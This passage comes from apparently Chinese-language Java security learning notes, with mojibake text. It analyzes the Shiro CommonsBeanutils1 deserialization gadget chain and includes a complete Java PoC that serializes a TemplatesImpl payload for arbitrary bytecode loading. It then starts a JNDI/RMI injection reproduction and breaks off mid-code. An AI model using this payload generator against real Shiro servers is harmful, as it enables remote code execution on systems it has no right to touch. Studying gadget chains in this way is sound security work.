title="åˆ©ç”¨é“¾æµç¨‹ï¼š"></a>åˆ©ç”¨é“¾æµç¨‹ï¼š</h4><p>**å…¥å£ç‚¹ï¼š**PriorityQueue#readObjectæ–¹æ³•ï¼ˆjava&#x2F;util&#x2F;PriorityQueue.javaï¼‰ï¼ŒPriorityQueueç±»ä¸­é‡å†™äº†readObjectæ–¹æ³•ï¼ŒShiroååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨è¿™ä¸ªç±»è°ƒç”¨é‡å†™çš„readObjectæ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110916682.png" alt="null"></p><p>æ­¥å…¥ heapify() </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110920916.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">// PriorityQueue æƒ³è±¡æˆä¸€ä¸ªäºŒå‰å †ï¼Œæœ¬è´¨æ˜¯ç”¨ä¸€ä¸ªæ•°ç»„ queue[] å­˜å‚¨çš„ç‰¹æ®ŠäºŒå‰æ ‘<br>// heapify çš„ä½œç”¨å°±æ˜¯æŠŠä¸€ä¸ªâ€œä¹±åºâ€çš„æ•°ç»„ï¼Œé‡æ–°æ•´ç†æˆç¬¦åˆå †è§„åˆ™çš„å°æ ¹å †ï¼ˆå³çˆ¶èŠ‚ç‚¹å€¼ &lt;= å­èŠ‚ç‚¹å€¼ï¼‰<br>private void heapify() &#123;<br>    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› siftDown</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110921238.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">// siftDown() æ–¹æ³•å…¶å®æ˜¯ å †åŒ–(heapify) çš„æ ¸å¿ƒæ­¥éª¤ä¹‹ä¸€ï¼Œç”¨äºæŠŠæŸä¸ªå…ƒç´ å¾€ä¸‹ç§»åŠ¨ï¼Œä½¿å…¶ç¬¦åˆå°æ ¹å †è§„åˆ™<br>private void siftDown(int k, E x) &#123;<br>    if (comparator != null)<br>        siftDownUsingComparator(k, x);<br>    else<br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› siftDownUsingComparator ï¼Œå †åŒ–æ“ä½œï¼ˆheapifyï¼‰çš„å…·ä½“å®ç°ï¼Œç”¨ <code>Comparator</code> æ¥æ¯”è¾ƒå…ƒç´ å¤§å°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110922654.png" alt="null"></p><p>è·Ÿè¿› comparator#compareï¼Œ<code>Comparator&lt;T&gt;</code> æ˜¯ä¸€ä¸ª<strong>å‡½æ•°å¼æ¥å£</strong>ï¼Œç”¨æ¥å®šä¹‰â€œä¸¤ä¸ªå¯¹è±¡è°å¤§è°å°â€ã€‚</p><p>å®ƒä¸è¦æ±‚å¯¹è±¡æœ¬èº«å®ç° <code>Comparable</code>ï¼Œå¯ä»¥æŠŠæ¯”è¾ƒè§„åˆ™å¤–ç½®ã€‚</p><p><strong>è¿”å›å€¼è§„åˆ™</strong>ï¼š</p><ul><li><p><code>&lt; 0</code> â†’ <code>o1</code> æ¯” <code>o2</code> å°</p></li><li><p><code>0</code> â†’ ç›¸ç­‰</p></li><li><p><code>&gt; 0</code> â†’ <code>o1</code> æ¯” <code>o2</code> å¤§</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110958560.png" alt="null"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦æ‰¾åˆ°å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ¥å£ï¼š</p><p><strong>å…³é”®ç‚¹ï¼šBeanComparator.compare</strong></p><p>BeanComparatorç»§æ‰¿äº†Comparatorç±»å’ŒSerializableç±»ï¼Œå¹¶ä¸”å‡ºç°äº†PropertyUtils.getProperty()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111009650.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111012610.png" alt="null"></p><p>é‚£ä¹ˆï¼Œå½“æ‰§è¡Œ <code>Object value1 = PropertyUtils.getProperty(o1, this.property);</code>æ—¶ï¼Œå¯¹å…¶ä¼ å‚ï¼š</p><ul><li><p><code>o1 = new TemplatesImpl()</code></p></li><li><p><code>property = outputProperties</code></p></li><li><p>å°±ä¼šè‡ªåŠ¨è°ƒç”¨ <code>TemplatesImpl#getOutputProperties</code> æ–¹æ³•</p></li></ul><p><strong>å…³é”®ç‚¹ï¼šgetOutputProperties</strong></p><p>æ‰¾åˆ° getOutputPropertiesï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111020514.png" alt="null"></p><p>æ‰§è¡Œï¼š<code>newTransformer().getOutputProperties();</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111022417.png" alt="null"></p><p>è·Ÿè¿› newTransformer</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111023103.png" alt="null"></p><p>è·Ÿè¿›getTransletInstance</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111318767.png" alt="null"></p><p>è·Ÿè¿› defineTransletClassesï¼Œå½“æ»¡è¶³ <code>_bytecodes !== null</code>ï¼Œå‘ä¸‹æ‰§è¡Œ <code>loader.defineClass(_bytecodes[i])</code> ï¼Œå°†_bytecodes[i]ä¸­çš„å­—èŠ‚ç è½¬æ¢ä¸ºClasså¯¹è±¡ï¼Œå¹¶å°†è¯¥ç±»åŠ è½½æ‰§è¡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111321868.png" alt="null"></p><h4 id="æ€»ç»“è°ƒç”¨é“¾ï¼š"><a href="#æ€»ç»“è°ƒç”¨é“¾ï¼š" class="headerlink" title="æ€»ç»“è°ƒç”¨é“¾ï¼š"></a>æ€»ç»“è°ƒç”¨é“¾ï¼š</h4><p>PriorityQueue#readObjectï¼ˆå…¥å£ç‚¹ Sourceï¼‰ -&gt; heapify() -&gt; siftDown() -&gt; siftDownUsingComparator() -&gt; comparator.compare() </p><p>-&gt; BeanComparator.compare()</p><p>-&gt; PropertyUtils.getProperty() </p><p>-&gt;  TemplatesImpl#getOutputProperties()ï¼ˆæ‰§è¡Œç‚¹ Sinkï¼‰ -&gt; newTransformer() -&gt; getTransletInstance() -&gt; defineTransletClasses() </p><p>-&gt; loader.defineClass()</p><p>å‚ç…§å›¾ç‰‡ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101449749.jpeg" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111343165.png" alt="null"></p><h4 id="æ€»ç»“æ¡ä»¶ï¼š"><a href="#æ€»ç»“æ¡ä»¶ï¼š" class="headerlink" title="æ€»ç»“æ¡ä»¶ï¼š"></a>æ€»ç»“æ¡ä»¶ï¼š</h4><ol><li><p>sizeå€¼å¤§äºç­‰äº2ï¼›<code>size &gt;&gt;&gt; 1</code></p></li><li><p><code>comparator != null</code></p></li><li><p><code>this.property != null</code></p></li><li><p><code>o1 = new TemplatesImpl()</code>&amp;<code>this.property = outputProperties</code></p></li><li><p><code>_name != null</code>&amp;<code>_class == null</code></p></li><li><p><code>_bytecodes != null</code></p></li></ol><h4 id="POCç¼–å†™åˆ†æ-ï¼š"><a href="#POCç¼–å†™åˆ†æ-ï¼š" class="headerlink" title="POCç¼–å†™åˆ†æ ï¼š"></a>POCç¼–å†™åˆ†æ ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.shiroattack;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1Shiro</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//getClass è·å–å¯¹è±¡çš„ç±»ï¼ŒgetDeclaredField é€šè¿‡åå°„è·å–è¿™ä¸ªç±»çš„å£°æ˜å­—æ®µï¼ˆåŒ…æ‹¬ privateï¼‰</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        <span class="hljs-comment">//setAccessible(true) å…³é—­Javaè¯­è¨€è®¿é—®æ£€æŸ¥ï¼Œå…è®¸ç¨‹åºè®¿é—®å’Œä¿®æ”¹ç§æœ‰å­—æ®µï¼Œå…è®¸æˆ‘ä»¬çªç ´ç§æœ‰æƒé™é™åˆ¶ï¼Œæ“ä½œç§æœ‰å­—æ®µ</span><br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//æŠŠä¼ å…¥çš„ value èµ‹ç»™ obj å¯¹è±¡çš„è¿™ä¸ªå­—æ®µ</span><br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// TemplatesImpl ç±» å¸¸ç”¨äºåŠ è½½ XSLT æ¨¡æ¿,æ ¸å¿ƒæ˜¯å®ƒ _bytecodes å­—æ®µï¼Œå­˜æ”¾å­—èŠ‚ç </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">// ä½¿ç”¨setFieldValueæ–¹æ³•ä¿®æ”¹å…¶ç›¸å…³æˆå‘˜å˜é‡çš„å€¼</span><br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazzBytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        <span class="hljs-comment">// TransformerFactoryImpl</span><br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª BeanComparatorï¼Œåˆå§‹çš„ property å­—æ®µä¸º null</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œä½¿ç”¨åˆšåˆ›å»ºçš„ BeanComparator ä½œä¸ºå…ƒç´ æ¯”è¾ƒå™¨</span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>        <span class="hljs-comment">// stub data for replacement later</span><br>        <span class="hljs-comment">//å…ˆå¾€ PriorityQueue æ·»åŠ ä¸¤ä¸ªå ä½å…ƒç´  &quot;1&quot;</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-comment">//é€šè¿‡åå°„è®¾ç½® comparator çš„ property å­—æ®µä¸º &quot;outputProperties&quot;,BeanComparator ä¼šåœ¨æ¯”è¾ƒæ—¶é€šè¿‡åå°„è°ƒç”¨å¯¹è±¡çš„ getOutputProperties() æ–¹æ³•</span><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">//é€šè¿‡ ObjectOutputStream æŠŠæ„é€ å¥½çš„ PriorityQueue å¯¹è±¡åºåˆ—åŒ–æˆå­—èŠ‚æ•°ç»„</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2025/09/24/JNDI/"/>
    <url>/2025/09/24/JNDI/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€JNDI-ç®€ä»‹"><a href="#ä¸€ã€JNDI-ç®€ä»‹" class="headerlink" title="ä¸€ã€JNDI ç®€ä»‹"></a>ä¸€ã€JNDI ç®€ä»‹</h1><p>JNDI(Java Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£) æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„ APIï¼Œä¸€ç§æ ‡å‡†çš„ Java å‘½åç³»ç»Ÿæ¥å£ã€‚JNDI æä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯ APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£(SPI)çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°† JNDI API æ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿å¾— Java åº”ç”¨ç¨‹åºå¯ä»¥å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106579.png"></p><table><thead><tr><th><strong><font style="color:rgb(102, 102, 102);">åè®®</font></strong></th><th><strong><font style="color:rgb(102, 102, 102);">ä½œç”¨</font></strong></th></tr></thead><tbody><tr><td><font style="color:rgb(102, 102, 102);">LDAP</font></td><td><font style="color:rgb(102, 102, 102);">è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œçº¦å®šäº† Client ä¸ Server ä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ã€ä½¿ç”¨çš„ç«¯å£å·ã€è®¤è¯æ–¹å¼ç­‰å†…å®¹</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">RMI</font></td><td><font style="color:rgb(102, 102, 102);">JAVA è¿œç¨‹æ–¹æ³•åè®®ï¼Œè¯¥åè®®ç”¨äºè¿œç¨‹è°ƒç”¨åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">DNS</font></td><td><font style="color:rgb(102, 102, 102);">åŸŸåæœåŠ¡</font></td></tr><tr><td><font style="color:rgb(102, 102, 102);">CORBA</font></td><td><font style="color:rgb(102, 102, 102);">å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„</font></td></tr></tbody></table><h1 id="äºŒã€JNDI-å®ç°"><a href="#äºŒã€JNDI-å®ç°" class="headerlink" title="äºŒã€JNDI å®ç°"></a>äºŒã€JNDI å®ç°</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106238.png"></p><h1 id="ä¸‰ã€JNDI-æ³¨å…¥"><a href="#ä¸‰ã€JNDI-æ³¨å…¥" class="headerlink" title="ä¸‰ã€JNDI æ³¨å…¥"></a>ä¸‰ã€JNDI æ³¨å…¥</h1><h2 id="3-1-åˆ†ææ¼æ´å¦‚ä½•äº§ç”Ÿ"><a href="#3-1-åˆ†ææ¼æ´å¦‚ä½•äº§ç”Ÿ" class="headerlink" title="3.1 åˆ†ææ¼æ´å¦‚ä½•äº§ç”Ÿ"></a>3.1 åˆ†ææ¼æ´å¦‚ä½•äº§ç”Ÿ</h2><p>æ­¤å¤„æ–­ç‚¹è°ƒè¯•ï¼Œè·Ÿè¿› lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107810.png"></p><p>InitialContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107722.png"></p><p>GenericURLContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107072.png"></p><p>RegistryContext.lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107413.png"></p><p>RegistryImpl_Stub.lookup      åˆ°è¿™é‡Œå°±ä¸ç”¨è·Ÿäº†ï¼Œæ”»å‡»æ–¹å¼å’Œ RMI ä¸­æ”»å‡»æ³¨å†Œä¸­å¿ƒä¸€æ ·ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107847.png"></p><blockquote><p>RMI ä¸­çš„æ”»å‡»æ³¨å†Œä¸­å¿ƒï¼š<a href="https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5">https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5</a></p></blockquote><h2 id="3-2-Jndi-RMI"><a href="#3-2-Jndi-RMI" class="headerlink" title="3.2 Jndi + RMI"></a>3.2 <font style="color:rgb(80, 80, 92);">Jndi + RMI</font></h2><h3 id="å¤ç°ï¼š"><a href="#å¤ç°ï¼š" class="headerlink" title="å¤ç°ï¼š"></a>å¤ç°ï¼š</h3><p> å…ˆå†™ä¸€ä¸ªå¼¹å‡ºè®¡ç®—å™¨ç±»å¹¶ç¼–è¯‘ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107819.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107878.png"></p><p>ä¹‹åç”¨ python å¼€ä¸€ä¸ª http æœåŠ¡ï¼Œç›‘å¬ 7777 ç«¯å£</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107851.png"></p><p>æœåŠ¡ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl());</span><br><br><br>        <span class="hljs-comment">// åœ¨å½“å‰ JVM ä¸­å¯åŠ¨ï¼ˆæˆ–åˆ›å»ºï¼‰ä¸€ä¸ª RMI registryï¼Œç›‘å¬ç«¯å£ 1099</span><br>        <span 